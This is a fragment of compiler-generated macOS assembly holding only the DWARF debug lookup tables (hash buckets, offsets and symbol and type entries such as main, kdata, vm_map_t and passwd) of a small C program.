	.long	2090499946                      ; Hash in Bucket 3
	.long	264749034                       ; Hash in Bucket 4
	.long	-864381713                      ; Hash in Bucket 5
	.long	-602249276                      ; Hash in Bucket 5
	.long	-322446067                      ; Hash in Bucket 5
	.long	274811347                       ; Hash in Bucket 6
.set Lset28, LNames0-Lnames_begin       ; Offset in Bucket 1
	.long	Lset28
.set Lset29, LNames2-Lnames_begin       ; Offset in Bucket 3
	.long	Lset29
.set Lset30, LNames1-Lnames_begin       ; Offset in Bucket 4
	.long	Lset30
.set Lset31, LNames4-Lnames_begin       ; Offset in Bucket 5
	.long	Lset31
.set Lset32, LNames6-Lnames_begin       ; Offset in Bucket 5
	.long	Lset32
.set Lset33, LNames3-Lnames_begin       ; Offset in Bucket 5
	.long	Lset33
.set Lset34, LNames5-Lnames_begin       ; Offset in Bucket 6
	.long	Lset34
LNames0:
	.long	735                             ; __os_log_helper_16_0_0
	.long	1                               ; Num DIEs
	.long	1386
	.long	0
LNames2:
	.long	730                             ; main
	.long	1                               ; Num DIEs
	.long	149
	.long	0
LNames1:
	.long	247                             ; kdata
	.long	1                               ; Num DIEs
	.long	110
	.long	0
LNames4:
	.long	758                             ; __os_log_helper_16_0_2_4_0_4_0
	.long	1                               ; Num DIEs
	.long	1418
	.long	0
LNames6:
	.long	285                             ; _os_fmt_str
	.long	4                               ; Num DIEs
	.long	174
	.long	195
	.long	216
	.long	237
	.long	0
LNames3:
	.long	235                             ; _dlsym
	.long	1                               ; Num DIEs
	.long	50
	.long	0
LNames5:
	.long	724                             ; start
	.long	1                               ; Num DIEs
	.long	1178
	.long	0
	.section	__DWARF,__apple_objc,regular,debug
Lobjc_begin:
	.long	1212240712                      ; Header Magic
	.short	1                               ; Header Version
	.short	0                               ; Header Hash Function
	.long	1                               ; Header Bucket Count
	.long	0                               ; Header Hash Count
	.long	12                              ; Header Data Length
	.long	0                               ; HeaderData Die Offset Base
	.long	1                               ; HeaderData Atom Count
	.short	1                               ; DW_ATOM_die_offset
	.short	6                               ; DW_FORM_data4
	.long	-1                              ; Bucket 0
	.section	__DWARF,__apple_namespac,regular,debug
Lnamespac_begin:
	.long	1212240712                      ; Header Magic
	.short	1                               ; Header Version
	.short	0                               ; Header Hash Function
	.long	1                               ; Header Bucket Count
	.long	0                               ; Header Hash Count
	.long	12                              ; Header Data Length
	.long	0                               ; HeaderData Die Offset Base
	.long	1                               ; HeaderData Atom Count
	.short	1                               ; DW_ATOM_die_offset
	.short	6                               ; DW_FORM_data4
	.long	-1                              ; Bucket 0
	.section	__DWARF,__apple_types,regular,debug
Ltypes_begin:
	.long	1212240712                      ; Header Magic
	.short	1                               ; Header Version
	.short	0                               ; Header Hash Function
	.long	18                              ; Header Bucket Count
	.long	36                              ; Header Hash Count
	.long	20                              ; Header Data Length
	.long	0                               ; HeaderData Die Offset Base
	.long	3                               ; HeaderData Atom Count
	.short	1                               ; DW_ATOM_die_offset
	.short	6                               ; DW_FORM_data4
	.short	3                               ; DW_ATOM_die_tag
	.short	5                               ; DW_FORM_data2
	.short	4                               ; DW_ATOM_type_flags
	.short	11                              ; DW_FORM_data1
	.long	0                               ; Bucket 0
	.long	-1                              ; Bucket 1
	.long	4                               ; Bucket 2
	.long	5                               ; Bucket 3
	.long	6                               ; Bucket 4
	.long	8                               ; Bucket 5
	.long	10                              ; Bucket 6
	.long	11                              ; Bucket 7
	.long	13                              ; Bucket 8
	.long	15                              ; Bucket 9
	.long	17                              ; Bucket 10
	.long	18                              ; Bucket 11
	.long	-1                              ; Bucket 12
	.long	22                              ; Bucket 13
	.long	26                              ; Bucket 14
	.long	28                              ; Bucket 15
	.long	31                              ; Bucket 16
	.long	33                              ; Bucket 17
	.long	236774520                       ; Hash in Bucket 0
	.long	1578324600                      ; Hash in Bucket 0
	.long	-1880351968                     ; Hash in Bucket 0
	.long	-1314921064                     ; Hash in Bucket 0
	.long	193495088                       ; Hash in Bucket 2
	.long	-1863999343                     ; Hash in Bucket 3
	.long	260187628                       ; Hash in Bucket 4
	.long	276790522                       ; Hash in Bucket 4
	.long	-1304652851                     ; Hash in Bucket 5
	.long	-594775205                      ; Hash in Bucket 5
	.long	1058093052                      ; Hash in Bucket 6
	.long	-282664779                      ; Hash in Bucket 7
	.long	-243996567                      ; Hash in Bucket 7
	.long	264728150                       ; Hash in Bucket 8
	.long	290821634                       ; Hash in Bucket 8
	.long	-1070674411                     ; Hash in Bucket 9
	.long	-287314969                      ; Hash in Bucket 9
	.long	789719536                       ; Hash in Bucket 10
	.long	1713565019                      ; Hash in Bucket 11
	.long	1754681015                      ; Hash in Bucket 11
	.long	-2056763333                     ; Hash in Bucket 11
	.long	-80380739                       ; Hash in Bucket 11
	.long	-638822241                      ; Hash in Bucket 13
	.long	-520515531                      ; Hash in Bucket 13
	.long	-475665651                      ; Hash in Bucket 13
	.long	-69895251                       ; Hash in Bucket 13
	.long	-1558770578                     ; Hash in Bucket 14
	.long	-104093792                      ; Hash in Bucket 14
	.long	466678419                       ; Hash in Bucket 15
	.long	2132528559                      ; Hash in Bucket 15
	.long	-1937529961                     ; Hash in Bucket 15
	.long	-152971314                      ; Hash in Bucket 16
	.long	-136368420                      ; Hash in Bucket 16
	.long	290711645                       ; Hash in Bucket 17
	.long	339549335                       ; Hash in Bucket 17
	.long	2090147939                      ; Hash in Bucket 17
.set Lset35, Ltypes29-Ltypes_begin      ; Offset in Bucket 0
	.long	Lset35
.set Lset36, Ltypes15-Ltypes_begin      ; Offset in Bucket 0
	.long	Lset36
.set Lset37, Ltypes22-Ltypes_begin      ; Offset in Bucket 0
	.long	Lset37
.set Lset38, Ltypes30-Ltypes_begin      ; Offset in Bucket 0
	.long	Lset38
.set Lset39, Ltypes6-Ltypes_begin       ; Offset in Bucket 2
	.long	Lset39
.set Lset40, Ltypes8-Ltypes_begin       ; Offset in Bucket 3
	.long	Lset40
.set Lset41, Ltypes2-Ltypes_begin       ; Offset in Bucket 4
	.long	Lset41
.set Lset42, Ltypes16-Ltypes_begin      ; Offset in Bucket 4
	.long	Lset42
.set Lset43, Ltypes3-Ltypes_begin       ; Offset in Bucket 5
	.long	Lset43
.set Lset44, Ltypes31-Ltypes_begin      ; Offset in Bucket 5
	.long	Lset44
.set Lset45, Ltypes24-Ltypes_begin      ; Offset in Bucket 6
	.long	Lset45
.set Lset46, Ltypes17-Ltypes_begin      ; Offset in Bucket 7
	.long	Lset46
.set Lset47, Ltypes1-Ltypes_begin       ; Offset in Bucket 7
	.long	Lset47
.set Lset48, Ltypes28-Ltypes_begin      ; Offset in Bucket 8
	.long	Lset48
.set Lset49, Ltypes35-Ltypes_begin      ; Offset in Bucket 8
	.long	Lset49
.set Lset50, Ltypes12-Ltypes_begin      ; Offset in Bucket 9
	.long	Lset50
.set Lset51, Ltypes0-Ltypes_begin       ; Offset in Bucket 9
	.long	Lset51
.set Lset52, Ltypes7-Ltypes_begin       ; Offset in Bucket 10
	.long	Lset52
.set Lset53, Ltypes18-Ltypes_begin      ; Offset in Bucket 11
	.long	Lset53
.set Lset54, Ltypes14-Ltypes_begin      ; Offset in Bucket 11
	.long	Lset54
.set Lset55, Ltypes32-Ltypes_begin      ; Offset in Bucket 11
	.long	Lset55
.set Lset56, Ltypes19-Ltypes_begin      ; Offset in Bucket 11
	.long	Lset56
.set Lset57, Ltypes33-Ltypes_begin      ; Offset in Bucket 13
	.long	Lset57
.set Lset58, Ltypes11-Ltypes_begin      ; Offset in Bucket 13
	.long	Lset58
.set Lset59, Ltypes4-Ltypes_begin       ; Offset in Bucket 13
	.long	Lset59
.set Lset60, Ltypes26-Ltypes_begin      ; Offset in Bucket 13
	.long	Lset60
.set Lset61, Ltypes27-Ltypes_begin      ; Offset in Bucket 14
	.long	Lset61
.set Lset62, Ltypes34-Ltypes_begin      ; Offset in Bucket 14
	.long	Lset62
.set Lset63, Ltypes9-Ltypes_begin       ; Offset in Bucket 15
	.long	Lset63
.set Lset64, Ltypes5-Ltypes_begin       ; Offset in Bucket 15
	.long	Lset64
.set Lset65, Ltypes13-Ltypes_begin      ; Offset in Bucket 15
	.long	Lset65
.set Lset66, Ltypes10-Ltypes_begin      ; Offset in Bucket 16
	.long	Lset66
.set Lset67, Ltypes21-Ltypes_begin      ; Offset in Bucket 16
	.long	Lset67
.set Lset68, Ltypes20-Ltypes_begin      ; Offset in Bucket 17
	.long	Lset68
.set Lset69, Ltypes23-Ltypes_begin      ; Offset in Bucket 17
	.long	Lset69
.set Lset70, Ltypes25-Ltypes_begin      ; Offset in Bucket 17
	.long	Lset70
Ltypes29:
	.long	476                             ; vm_map_t
	.long	1                               ; Num DIEs
	.long	843
	.short	22
	.byte	0
	.long	0
Ltypes15:
	.long	677                             ; boolean_t
	.long	1                               ; Num DIEs
	.long	1102
	.short	22
	.byte	0
	.long	0
Ltypes22:
	.long	1136                            ; long int
	.long	1                               ; Num DIEs
	.long	1804
	.short	36
	.byte	0
	.long	0
Ltypes30:
	.long	576                             ; mach_vm_address_t
	.long	1                               ; Num DIEs
	.long	905
	.short	22
	.byte	0
	.long	0
Ltypes6:
	.long	430                             ; int
	.long	1                               ; Num DIEs
	.long	768
	.short	36
	.byte	0
	.long	0
Ltypes8:
	.long	544                             ; __darwin_natural_t
	.long	1                               ; Num DIEs
	.long	887
	.short	22
	.byte	0
	.long	0
Ltypes2:
	.long	1089                            ; gid_t
	.long	1                               ; Num DIEs
	.long	1771
	.short	22
	.byte	0
	.long	0
Ltypes16:
	.long	969                             ; uid_t
	.long	1                               ; Num DIEs
	.long	1576
	.short	22
	.byte	0
	.long	0
Ltypes3:
	.long	563                             ; unsigned int
	.long	1                               ; Num DIEs
	.long	898
	.short	36
	.byte	0
	.long	0
Ltypes31:
	.long	297                             ; __ARRAY_SIZE_TYPE__
	.long	1                               ; Num DIEs
	.long	648
	.short	36
	.byte	0
	.long	0
Ltypes24:
	.long	1020                            ; os_log_type_t
	.long	1                               ; Num DIEs
	.long	1609
	.short	22
	.byte	0
	.long	0
Ltypes17:
	.long	643                             ; __darwin_size_t
	.long	1                               ; Num DIEs
	.long	1048
	.short	22
	.byte	0
	.long	0
Ltypes1:
	.long	1120                            ; __darwin_time_t
	.long	1                               ; Num DIEs
	.long	1793
	.short	22
	.byte	0
	.long	0
Ltypes28:
	.long	831                             ; kconf
	.long	1                               ; Num DIEs
	.long	1474
	.short	19
	.byte	0
	.long	0
Ltypes35:
	.long	253                             ; uint64_t
	.long	1                               ; Num DIEs
	.long	131
	.short	22
	.byte	0
	.long	0
Ltypes12:
	.long	609                             ; mach_port_name_t
	.long	1                               ; Num DIEs
	.long	942
	.short	22
	.byte	0
	.long	0
Ltypes0:
	.long	462                             ; kern_return_t
	.long	1                               ; Num DIEs
	.long	832
	.short	22
	.byte	0
	.long	0
Ltypes7:
	.long	317                             ; uint8_t
	.long	1                               ; Num DIEs
	.long	718
	.short	22
	.byte	0
	.long	0
Ltypes18:
	.long	697                             ; os_log_t
	.long	1                               ; Num DIEs
	.long	1124
	.short	22
	.byte	0
	.long	0
Ltypes14:
	.long	518                             ; __darwin_mach_port_name_t
	.long	1                               ; Num DIEs
	.long	876
	.short	22
	.byte	0
	.long	0
Ltypes32:
	.long	990                             ; __uint32_t
	.long	1                               ; Num DIEs
	.long	1598
	.short	22
	.byte	0
	.long	0
Ltypes19:
	.long	659                             ; long unsigned int
	.long	1                               ; Num DIEs
	.long	1059
	.short	36
	.byte	0
	.long	0
Ltypes33:
	.long	687                             ; vm_prot_t
	.long	1                               ; Num DIEs
	.long	1113
	.short	22
	.byte	0
	.long	0
Ltypes11:
	.long	485                             ; mach_port_t
	.long	1                               ; Num DIEs
	.long	854
	.short	22
	.byte	0
	.long	0
Ltypes4:
	.long	594                             ; mach_vm_size_t
	.long	1                               ; Num DIEs
	.long	916
	.short	22
	.byte	0
	.long	0
Ltypes26:
	.long	262                             ; long long unsigned int
	.long	1                               ; Num DIEs
	.long	142
	.short	36
	.byte	0
	.long	0
Ltypes27:
	.long	434                             ; asl_object_t
	.long	1                               ; Num DIEs
	.long	775
	.short	22
	.byte	0
	.long	0
Ltypes34:
	.long	325                             ; unsigned char
	.long	1                               ; Num DIEs
	.long	729
	.short	36
	.byte	0
	.long	0
Ltypes9:
	.long	636                             ; size_t
	.long	1                               ; Num DIEs
	.long	1037
	.short	22
	.byte	0
	.long	0
Ltypes5:
	.long	626                             ; natural_t
	.long	1                               ; Num DIEs
	.long	953
	.short	22
	.byte	0
	.long	0
Ltypes13:
	.long	497                             ; __darwin_mach_port_t
	.long	1                               ; Num DIEs
	.long	865
	.short	22
	.byte	0
	.long	0
Ltypes10:
	.long	1095                            ; __darwin_gid_t
	.long	1                               ; Num DIEs
	.long	1782
	.short	22
	.byte	0
	.long	0
Ltypes21:
	.long	975                             ; __darwin_uid_t
	.long	1                               ; Num DIEs
	.long	1587
	.short	22
	.byte	0
	.long	0
Ltypes20:
	.long	715                             ; uint32_t
	.long	1                               ; Num DIEs
	.long	1150
	.short	22
	.byte	0
	.long	0
Ltypes23:
	.long	1050                            ; passwd
	.long	1                               ; Num DIEs
	.long	1637
	.short	19
	.byte	0
	.long	0
Ltypes25:
	.long	242                             ; char
	.long	1                               ; Num DIEs
	.long	103
	.short	36
	.byte	0
	.long	0
.subsections_via_symbols
	.section	__DWARF,__debug_line,regular,debug
Lsection_line:
Lline_table_start0:
